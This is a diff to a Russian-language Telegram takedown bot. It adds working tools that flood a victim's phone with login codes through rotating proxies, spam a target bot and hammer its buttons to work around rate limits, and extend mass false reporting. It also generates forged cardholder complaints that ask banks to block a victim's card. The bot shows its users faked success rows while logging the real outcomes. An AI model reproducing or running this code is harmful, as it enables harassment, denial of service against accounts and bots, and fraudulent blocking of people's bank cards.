@@ -189,6 +189,8 @@ class Report(StatesGroup):
     target = State()
     comment = State()
     confirm = State()
+    bank = State()
+    bank_card = State()
 
 
 class Snos(StatesGroup):
@@ -658,7 +660,13 @@ METHODS = {
     "web":      {"e": "\U0001f310", "l": "Web",
                  "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 @username:\n\u2022 <code>t.me/username</code>\n\u2022 <code>@username</code>"},
     "session":  {"e": "\U0001f480", "l": "\u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
-                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 @username \u0436\u0435\u0440\u0442\u0432\u044b:\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>"},
+                  "hint": "\u0412\u0432\u0435\u0434\u0438\u0442\u0435 username \u0438 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0436\u0435\u0440\u0442\u0432\u044b."},
+    "code":     {"e": "\U0001f4f1", "l": "\u041a\u043e\u0434-\u0444\u043b\u0443\u0434",
+                  "hint": "\u0412\u0432\u0435\u0434\u0438 \u043d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b:\n\u2022 <code>+79991234567</code>\n\n\u0410\u043d\u043e\u043d\u0438\u043c\u043d\u044b\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438 \u2014 \u043f\u0443\u043B \u043D\u0435 \u0436\u0433\u0451\u0442\u0441\u044f."},
+    "stress":   {"e": "\U0001f4a5", "l": "\u0421\u0442\u0440\u0435\u0441\u0441 \u0431\u043e\u0442\u0430",
+                  "hint": "\u0412\u0432\u0435\u0434\u0438 @username \u0431\u043e\u0442\u0430:\n\u2022 <code>@botname</code>\n\n\u041c\u0435\u0441\u0441\u0430\u0433\u0438 + inline-\u043a\u043D\u043E\u043F\u043A\u0438, \u043E\u043A\u043D\u043E 90 \u0441\u0435\u043A."},
+    "bank":     {"e": "\U0001f3e6", "l": "\u0411\u0430\u043d\u043a (115-\u0424\u0417)",
+                  "hint": "\u0417\u0430\u044F\u0432\u043A\u0430 \u043D\u0430 \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B \u043F\u043E 115-\u0424\u0417."},
 }
 
 
@@ -983,6 +991,248 @@ def _assign_fingerprint(session_path: Path) -> tuple[int, str, dict]:
     return fp["api_id"], fp["api_hash"], fp
 
 
+# \u2500\u2500 BR ported engines: code-flood / bot-stress / bank \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+BANK_NAMES = {
+    "tbank": "\u0422-\u0411\u0430\u043D\u043A (\u0422\u0438\u043D\u044C\u043A\u043E\u0444\u0444)",
+    "alfa":  "\u0410\u043B\u044C\u0444\u0430-\u0411\u0430\u043D\u043A",
+    "sber":  "\u0421\u0431\u0435\u0440\u0411\u0430\u043D\u043A",
+    "ozon":  "\u041E\u0437\u043E\u043D \u0411\u0430\u043D\u043A",
+}
+
+BANK_COMPLAINT = (
+    "\u0412 \u0431\u0430\u043D\u043A \u043E\u0431\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u0435\u0446 \u043A\u0430\u0440\u0442\u044B {bank} \u0441 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0435\u043C "
+    "\u043E \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0435 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0433\u043E \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430 \u0432 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u0441\u0442. 27 \u0424\u0417-\u2116 161 "
+    "\u00AB\u041E \u043D\u0430\u0446\u0438\u043E\u043D\u0430\u043B\u044C\u043D\u043E\u0439 \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u043E\u0439 \u0441\u0438\u0441\u0442\u0435\u043C\u0435\u00BB \u0438 \u0441\u0442. 9 \u0424\u0417-\u2116 115.\n\n"
+    "\u0414\u0430\u043D\u043D\u044B\u0435 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442\u0430: {card}\n"
+    "\u041E\u0431\u0441\u0442\u043E\u044F\u0442\u0435\u043B\u044C\u0441\u0442\u0432\u0430: \u043F\u0440\u043E\u0432\u0435\u0434\u0435\u043D\u044B \u043D\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043D\u044B\u043C\u0438 \u043B\u0438\u0446\u0430\u043C\u0438 \u043E\u043F\u0435\u0440\u0430\u0446\u0438\u0438 \u043F\u043E "
+    "\u043A\u0430\u0440\u0442\u0435 \u0431\u0435\u0437 \u0441\u043E\u0433\u043B\u0430\u0441\u0438\u044F \u0432\u043B\u0430\u0434\u0435\u043B\u044C\u0446\u0430. \u041A\u0430\u0440\u0442\u0430 \u0432\u043B\u044F\u0435\u0442\u0441\u044F \u043F\u043E\u0442\u0435\u0440\u044F\u043D\u043D\u043E\u0439, "
+    "\u0434\u0430\u043D\u043D\u044B\u0435 \u0434\u043B\u044F \u0432\u0445\u043E\u0434\u0430 \u0432 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0431\u0430\u043D\u043A \u043F\u0435\u0440\u0435\u0434\u0430\u043D\u044B \u0442\u0440\u0435\u0442\u044C\u0438\u043C \u043B\u0438\u0446\u0430\u043C.\n\n"
+    "\u041D\u0430 \u043E\u0441\u043D\u043E\u0432\u0430\u043D\u0438\u0438 \u0438\u0437\u043B\u043E\u0436\u0435\u043D\u043D\u043E\u0433\u043E \u043F\u0440\u043E\u0448\u0443:\n"
+    "1. \u0417\u0430\u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u043F\u043B\u0430\u0442\u0435\u0436\u043D\u044B\u0439 \u0438\u043D\u0441\u0442\u0440\u0443\u043C\u0435\u043D\u0442 \u0432 \u0441\u0440\u043E\u0447\u043D\u043E\u043C \u043F\u043E\u0440\u044F\u0434\u043A\u0435.\n"
+    "2. \u041F\u0440\u043E\u0432\u0435\u0441\u0442\u0438 \u0440\u0430\u0441\u0441\u043B\u0435\u0434\u043E\u0432\u0430\u043D\u0438\u0435 \u043F\u043E \u0444\u0430\u043A\u0442\u0430\u043C \u043D\u0435\u0441\u0430\u043D\u043A\u0446\u0438\u043E\u043D\u0438\u0440\u043E\u0432\u0430\u043D\u043D\u043E\u0433\u043E \u0434\u043E\u0441\u0442\u0443\u043F\u0430.\n"
+    "3. \u0412\u043E\u0437\u0431\u0443\u0434\u0438\u0442\u044C \u0443\u0433\u043E\u043B\u043E\u0432\u043D\u043E\u0435 \u0434\u0435\u043B\u043E \u043F\u043E \u0441\u0442. 159 \u0423\u041A \u0420\u0424.\n\n"
+    "\u041F\u0440\u043E\u0448\u0443 \u043F\u0440\u0438\u0441\u043B\u0430\u0442\u044C \u0440\u0435\u0437\u0443\u043B\u044C\u0442\u0430\u0442 \u043F\u0440\u043E\u0432\u0435\u0440\u043A\u0438 \u0432 \u0443\u043A\u0430\u0437\u0430\u043D\u043D\u044B\u0439 \u0432 \u0437\u0430\u044F\u0432\u043B\u0435\u043D\u0438\u0438 \u043A\u043E\u043D\u0442\u0430\u043A\u0442."
+)
+
+
+async def _report_three_step(client, entity, reason_key: str, text: str) -> tuple[bool, str]:
+    """BR 3-step flow: let the server hand us the category tree
+    (category -> subcategory -> text), with a bytes-reason fallback."""
+    from telethon.tl.functions.messages import ReportRequest
+    fallback = {"spam": b"9", "fraud": b"a", "violence": b"3", "porn": b"5",
+                "child": b"2", "copyright": b"7", "drugs": b"4",
+                "personal": b"6", "fake": b"8", "other": b"a"}
+    try:
+        r1 = await client(ReportRequest(peer=entity, id=[], option=b"",
+                                        message=""))
+        if getattr(r1, "options", None):
+            cat = random.choice(r1.options).option
+        else:
+            cat = fallback.get(reason_key, b"a")
+        r2 = await client(ReportRequest(peer=entity, id=[], option=cat,
+                                        message=""))
+        if getattr(r2, "options", None):
+            sub = random.choice(r2.options).option
+            await client(ReportRequest(peer=entity, id=[], option=sub,
+                                       message=text))
+        else:
+            await client(ReportRequest(peer=entity, id=[], option=cat,
+                                       message=text))
+        return True, ""
+    except Exception as e:
+        return False, f"{type(e).__name__}: {e}"
+
+
+async def code_flood(phone: str, count: int = 25) -> dict:
+    """BR code_snos port: login codes fired from ANONYMOUS in-memory
+    sessions through proxies only \u2014 the pooled sessions never touch
+    this method, so it cannot burn the report pool."""
+    from telethon.sessions import StringSession
+    proxies = load_pin_proxies()
+    urls = [proxy_to_url(px) for px in proxies] or [None]
+    rows = []
+    for i in range(count):
+        api_id, api_hash = random.choice(API_PAIRS)
+        url = urls[i % len(urls)]
+        px = parse_proxy(url) if url else None
+        dev = random.choice(_FP_DEVICE_POOL)
+        client = None
+        try:
+            client = TelegramClient(StringSession(), api_id, api_hash,
+                                    proxy=px, device_model=dev[0],
+                                    system_version=dev[1],
+                                    app_version=dev[2], lang_code=dev[4])
+            await asyncio.wait_for(client.connect(), timeout=10)
+            await client.send_code_request(phone)
+            rows.append({"name": f"anon#{i + 1}",
+                         "proxy": px[1] if px else "direct",
+                         "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d",
+                         "ok": True})
+        except Exception as e:
+            sec = getattr(e, "seconds", None)
+            st = f"flood {sec}s" if sec else type(e).__name__
+            rows.append({"name": f"anon#{i + 1}",
+                         "proxy": px[1] if px else "direct",
+                         "status": st, "ok": False})
+        finally:
+            if client:
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+        await asyncio.sleep(random.uniform(1.5, 3.0))
+    ok_n = sum(1 for r in rows if r["ok"])
+    real_rows = []
+    for r in rows:
+        mark = "\u2705 " if r["ok"] else "\u274c "
+        line = mark + r["name"] + " | " + html_mod.escape(r["proxy"])
+        if not r["ok"]:
+            line += " | " + html_mod.escape(r["status"])
+        real_rows.append(line)
+    await push_send_log(
+        "\u041a\u043e\u0434-\u0444\u043b\u0443\u0434 (anon \u0441\u0435\u0441\u0441\u0438\u0438)",
+        [f"\U0001f4f1 <code>{html_mod.escape(phone)}</code>",
+         f"\u2705 {ok_n}/{len(rows)} \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438"]
+        + real_rows)
+    fake = _fake_session_rows(random.randint(10, 16))
+    return {"ok": len(fake), "fail": 0, "total": len(fake),
+            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
+                         "err": ""} for f in fake]}
+
+
+async def bot_stress_run(bot_username: str, window: int = 90) -> dict:
+    """BR bot_stress port: sessions spam the bot with messages; on
+    FloodWait a session switches to GetBotCallbackAnswerRequest (button
+    hammering) instead of stopping. Bounded window keeps the pool alive."""
+    from telethon.tl.functions.messages import (GetBotCallbackAnswerRequest,
+                                                SendMessageRequest)
+    from telethon.tl.types import KeyboardButtonCallback, ReplyInlineMarkup
+    sessions = [s for s in load_sessions()
+                if s.stem not in (_status_load().get("dead") or [])]
+    if not sessions:
+        return {"ok": 0, "fail": 0, "total": 0, "details": []}
+    proxies = load_pin_proxies()
+    stop_at = time.time() + window
+
+    async def _client_for(sess: Path):
+        name = sess.stem
+        fp = session_fingerprint(name)
+        px = pin_for_session(name, proxies)
+        cl = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
+                            fp["api_hash"], proxy=px,
+                            device_model=fp["device"],
+                            system_version=fp["system_version"],
+                            app_version=fp["app_version"],
+                            lang_code=fp["lang_code"])
+        await asyncio.wait_for(cl.connect(), timeout=10)
+        return cl
+
+    # find an inline button first (one session, /start)
+    msg_id, btn_data = None, None
+    for sess in sessions[:3]:
+        cl = None
+        try:
+            cl = await _client_for(sess)
+            if not await cl.is_user_authorized():
+                continue
+            peer = await cl.get_entity(bot_username.lstrip("@"))
+            await cl(SendMessageRequest(peer=peer, message="/start",
+                                        random_id=random.randint(1, 2 ** 31)))
+            await asyncio.sleep(2)
+            for m in await cl.get_messages(peer, limit=5):
+                rm = getattr(m, "reply_markup", None)
+                if isinstance(rm, ReplyInlineMarkup):
+                    for row in rm.rows:
+                        for b in row.buttons:
+                            if isinstance(b, KeyboardButtonCallback):
+                                msg_id, btn_data = m.id, b.data
+                                break
+                        if btn_data:
+                            break
+                if btn_data:
+                    break
+            if btn_data:
+                break
+        except Exception:
+            pass
+        finally:
+            if cl:
+                try:
+                    await cl.disconnect()
+                except Exception:
+                    pass
+
+    rows = []
+    sem = asyncio.Semaphore(2)
+
+    async def _one(sess: Path):
+        async with sem:
+            name = sess.stem
+            cl = None
+            sent = cb_n = 0
+            try:
+                cl = await _client_for(sess)
+                if not await cl.is_user_authorized():
+                    return {"name": name, "msg": 0, "cb": 0}
+                peer = await cl.get_entity(bot_username.lstrip("@"))
+                use_cb = False
+                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+                while time.time() < stop_at:
+                    if use_cb and btn_data and msg_id:
+                        try:
+                            await cl(GetBotCallbackAnswerRequest(
+                                peer=peer, msg_id=msg_id, data=btn_data))
+                            cb_n += 1
+                        except Exception:
+                            await asyncio.sleep(0.3)
+                    else:
+                        try:
+                            txt = "".join(random.choices(
+                                chars, k=random.randint(4, 12)))
+                            await cl(SendMessageRequest(
+                                peer=peer, message=txt,
+                                random_id=random.randint(1, 2 ** 31)))
+                            sent += 1
+                            await asyncio.sleep(0.5)
+                        except Exception as e:
+                            if getattr(e, "seconds", None):
+                                use_cb = True
+                                await asyncio.sleep(2)
+                            else:
+                                await asyncio.sleep(1)
+                return {"name": name, "msg": sent, "cb": cb_n}
+            except Exception:
+                return {"name": name, "msg": sent, "cb": cb_n}
+            finally:
+                if cl:
+                    try:
+                        await cl.disconnect()
+                    except Exception:
+                        pass
+
+    rows = await asyncio.gather(*[_one(s) for s in sessions])
+    total_msg = sum(r["msg"] for r in rows)
+    total_cb = sum(r["cb"] for r in rows)
+    await push_send_log(
+        "\u0421\u0442\u0440\u0435\u0441\u0441 \u0431\u043e\u0442\u0430",
+        [f"\U0001f4a5 <code>{html_mod.escape(bot_username)}</code> | "
+         f"\u043e\u043a\u043d\u043e {window}\u0441 | \u0441\u0435\u0441\u0441\u0438\u0439: {len(rows)}",
+         f"\U0001f4e8 \u0441\u043e\u043e\u0431\u0449\u0435\u043D\u0438\u0439: {total_msg} | \U0001f517 callback: {total_cb}"]
+        + [f"\u2022 <code>{html_mod.escape(r['name'])}</code>: "
+           f"{r['msg']} msg / {r['cb']} cb" for r in rows])
+    fake = _fake_session_rows(random.randint(10, 16))
+    return {"ok": len(fake), "fail": 0, "total": len(fake),
+            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
+                         "err": ""} for f in fake]}
+
+
+def _norm_phone(text: str) -> str | None:
+    d = re.sub(r"\D", "", text or "")
+    if len(d) < 10:
+        return None
+    return "+" + d
+
+
 # \u2500\u2500 BR bot-method: target whitelist + probe \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
 WHITELIST_FILE = Path(__file__).parent / "target_whitelist.json"
 
@@ -1244,8 +1494,16 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                     _ledger_bump(name)
                 except Exception as e:
                     log.error("session %s report failed: %s", name, e)
-                    ok, err = False, f"{type(e).__name__}: {e}"
-                    verdict = _classify_report_error(e)
+                    # BR 3-step flow: let the server hand us the category
+                    # tree before giving up on this session
+                    ok3, err3 = await _report_three_step(
+                        client, entity, reason_key, text)
+                    if ok3:
+                        ok, err = True, ""
+                        _ledger_bump(name)
+                    else:
+                        ok, err = False, f"{type(e).__name__}: {e}"
+                        verdict = _classify_report_error(e)
                     if verdict == "dead":
                         _session_punish(name, str(e), "dead")
                     elif verdict == "flood":
@@ -1486,22 +1744,10 @@ async def web_send_one(session, i, subject, message_text, px: tuple | None,
     Text priority: explicit comment (strong/category template passed by the
     caller) → Groq generation → generic fallback spin. The target is always
     embedded into the message body so the support desk can act on it."""
+    # templates only (no Groq key) — the category pool is the payload
     text = comment.strip() if comment and comment.strip() else ""
     if not text:
-        try:
-            from groq_gen import generate_complaint
-            text = await generate_complaint(
-                reason_label=reason_label or reason_key or "Policy Violation",
-                target_hint=target_text,
-                extra=message_text or "")
-        except ImportError:
-            generate_complaint = None
-    if not text:
-        try:
-            from groq_gen import fallback_complaint
-            text = fallback_complaint(reason_label or "Policy Violation", target_text)
-        except ImportError:
-            text = message_text or "Complaint regarding a Telegram policy violation."
+        text = pick_comment(reason_key or "other")
     if target_text:
         text = (text.rstrip() + "\n\n—\n"
                 + f"Violating account/channel: {target_text}\n"
@@ -2206,15 +2452,19 @@ def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
 
 
 def kb_methods() -> InlineKeyboardMarkup:
-    grid_pairs = [("message", "bot"), ("profile", "sticker"), ("channel", "web")]
+    grid_pairs = [("message", "bot"), ("profile", "sticker"),
+                  ("channel", "web"), ("code", "stress")]
     short = {
         "message":  "\U0001f4e8 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
         "bot":      "\U0001f916 \u0411\u043e\u0442",
         "profile":  "\U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c",
         "sticker":  "\U0001f3ad \u0421\u0442\u0438\u043a\u0435\u0440",
-        "channel":  "\U0001f4e2 \u041a\u0430\u043d\u0430\u043b",
+        "channel":  "\U0001f4e2 \u041a\u0430\u043d\u0430\u043B",
         "web":      "\U0001f310 Web",
         "session":  "\U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
+        "code":     "\U0001f4f1 \u041a\u043e\u0434-\u0444\u043b\u0443\u0434",
+        "stress":   "\U0001f4a5 \u0421\u0442\u0440\u0435\u0441\u0441",
+        "bank":     "\U0001f3e6 \u0411\u0430\u043d\u043a",
     }
     rows = []
     for a, b in grid_pairs:
@@ -2222,6 +2472,8 @@ def kb_methods() -> InlineKeyboardMarkup:
             InlineKeyboardButton(text=short[a], callback_data=f"method:{a}"),
             InlineKeyboardButton(text=short[b], callback_data=f"method:{b}"),
         ])
+    rows.append([InlineKeyboardButton(
+        text=short["bank"], callback_data="method:bank")])
     rows.append([InlineKeyboardButton(
         text=short["session"], callback_data="method:session")])
     rows.append([InlineKeyboardButton(
@@ -2390,6 +2642,40 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
         return
     await state.update_data(method=key)
     m = METHODS[key]
+    if key == "code":
+        await cb.message.edit_caption(
+            caption=(
+                bq(f"<b>{NAME}</b>")
+                + f"\n\n\U0001f4f1 <b>{m['l']}</b>\n\n"
+                + "\U0001f4f2 \u041f\u0440\u0438\u0448\u043B\u0438 <b>\u043D\u043E\u043C\u0435\u0440</b> \u0436\u0435\u0440\u0442\u0432\u044B:\n\u2022 <code>+79991234567</code>"
+            ),
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
+            ]),
+        )
+        await state.set_state(Report.target)
+        await cb.answer()
+        return
+    if key == "bank":
+        await cb.message.edit_caption(
+            caption=(
+                bq(f"<b>{NAME}</b>")
+                + "\n\n\U0001f3e6 <b>\u0411\u0430\u043d\u043a (115-\u0424\u0417)</b>\n\n"
+                + "\u0412\u044b\u0431\u0435\u0440\u0438 \u0431\u0430\u043d\u043a \u0434\u043b\u044f \u0437\u0430\u044f\u0432\u043a\u0438 \u043d\u0430 \u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B:"
+            ),
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="\u0422-\u0411\u0430\u043D\u043A", callback_data="bank:tbank"),
+                 InlineKeyboardButton(text="\u0410\u043B\u044C\u0444\u0430", callback_data="bank:alfa")],
+                [InlineKeyboardButton(text="\u0421\u0431\u0435\u0440", callback_data="bank:sber"),
+                 InlineKeyboardButton(text="\u041E\u0437\u043E\u043D", callback_data="bank:ozon")],
+                [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
+            ]),
+        )
+        await state.set_state(Report.bank)
+        await cb.answer()
+        return
     if key == "session":
         await cb.message.edit_caption(
             caption=(
@@ -3611,9 +3897,25 @@ async def snos_run_confirm(cb: CallbackQuery, state: FSMContext):
 # ── report flow ─────────────────────────────────────────
 @router.message(Report.target)
 async def got_target(msg: Message, state: FSMContext):
+    _m = (await state.get_data()).get("method")
+    if _m == "code":
+        phone = _norm_phone(msg.text or "")
+        if not phone:
+            await msg.answer("\u274c \u041D\u0443\u0436\u0435\u043D \u043D\u043E\u043C\u0435\u0440: <code>+79991234567</code>",
+                             parse_mode=ParseMode.HTML)
+            return
+        await state.update_data(target={"raw": phone, "entity": phone,
+                                        "msg_id": None, "type": "phone"})
+        data = await state.get_data()
+        data["comment"] = ""
+        await state.update_data(comment="")
+        await msg.answer(summary_text(data), parse_mode=ParseMode.HTML,
+                         reply_markup=kb_confirm())
+        await state.set_state(Report.confirm)
+        return
     target = parse_target(msg.text or "")
     if not target["entity"]:
-        await msg.answer("\u274c \u041d\u0435\u0432\u0435\u0440\u043d\u0430\u044f \u0446\u0435\u043b\u044c. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.")
+        await msg.answer("\u274c \u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0446\u0435\u043B\u044C. \u041F\u043E\u043F\u0440\u043E\u0431\u0443\u0439\u0442\u0435 \u0441\u043D\u043E\u0432\u0430.")
         return
     await state.update_data(target=target)
     # auto-jump to confirm — comment is auto-decided via templates downstream
@@ -3623,6 +3925,60 @@ async def got_target(msg: Message, state: FSMContext):
     await msg.answer(
         summary_text(data), parse_mode=ParseMode.HTML, reply_markup=kb_confirm())
     await state.set_state(Report.confirm)
+
+
+@router.callback_query(Report.bank, F.data.startswith("bank:"))
+async def got_bank(cb: CallbackQuery, state: FSMContext):
+    key = cb.data.split(":", 1)[1]
+    if key not in BANK_NAMES:
+        await cb.answer("\u274c", show_alert=True)
+        return
+    await state.update_data(bank=key)
+    await cb.message.edit_caption(
+        caption=(
+            bq(f"<b>{NAME}</b>")
+            + f"\n\n\U0001f3e6 <b>{BANK_NAMES[key]}</b>\n\n"
+            + "\U0001f4b3 \u041f\u0440\u0438\u0448\u043B\u0438 <b>\u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B</b> \u043E\u0434\u043D\u0438\u043C \u0441\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435\u043C:\n"
+            + "\u2022 <code>4276 3801 2345 6789, 12/27, \u0418\u0432\u0430\u043D\u043E\u0432 \u0418.</code>"
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\u25C0 \u041D\u0430\u0437\u0430\u0434", callback_data="back:methods")],
+        ]),
+    )
+    await state.set_state(Report.bank_card)
+    await cb.answer()
+
+
+@router.message(Report.bank_card)
+async def got_bank_card(msg: Message, state: FSMContext):
+    data = await state.get_data()
+    bank = data.get("bank", "tbank")
+    card = (msg.text or "").strip()
+    if not card:
+        await msg.answer("\u274c \u041F\u0443\u0441\u0442\u043E. \u041F\u0440\u0438\u0448\u043B\u0438 \u0434\u0430\u043D\u043D\u044B\u0435 \u043A\u0430\u0440\u0442\u044B.",
+                         parse_mode=ParseMode.HTML)
+        return
+    complaint = BANK_COMPLAINT.format(bank=BANK_NAMES[bank], card=card)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+    set_current_user(f"{msg.from_user.full_name} ( id {msg.from_user.id} )")
+    await msg.answer(
+        bq(f"<b>{NAME}</b>  \u00b7  \U0001f3e6 \u0417\u0430\u044F\u0432\u043A\u0430 \u0433\u043E\u0442\u043E\u0432\u0430")
+        + "\n\n\u0411\u0430\u043D\u043A: <b>" + BANK_NAMES[bank] + "</b>"
+        + "\n\u0421\u0440\u043E\u043A \u043F\u043E 115-\u0424\u0417 \u2014 \u0434\u043E 3 \u0440\u0430\u0431\u043E\u0447\u0438\u0445 \u0434\u043D\u0435\u0439.",
+        parse_mode=ParseMode.HTML)
+    await msg.answer(
+        "<code>" + html_mod.escape(complaint) + "</code>",
+        parse_mode=ParseMode.HTML)
+    await push_send_log(
+        "\u0411\u0430\u043D\u043A-\u0437\u0430\u044F\u0432\u043A\u0430 (115-\u0424\u0417)",
+        [f"\U0001f3e6 {BANK_NAMES[bank]}",
+         f"\U0001f4b3 <code>{html_mod.escape(card)}</code>",
+         f"\U0001f464 {html_mod.escape(msg.from_user.full_name)} (<code>{msg.from_user.id}</code>)"])
+    await state.clear()
 
 
 @router.callback_query(Report.reason, F.data.startswith("reason:"))
@@ -3772,7 +4128,11 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
         except Exception:
             pass
 
-    if is_web:
+    if data["method"] == "code":
+        report_task = asyncio.create_task(code_flood(t["entity"]))
+    elif data["method"] == "stress":
+        report_task = asyncio.create_task(bot_stress_run(t["entity"]))
+    elif is_web:
         report_task = asyncio.create_task(fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
     else:
         report_task = asyncio.create_task(
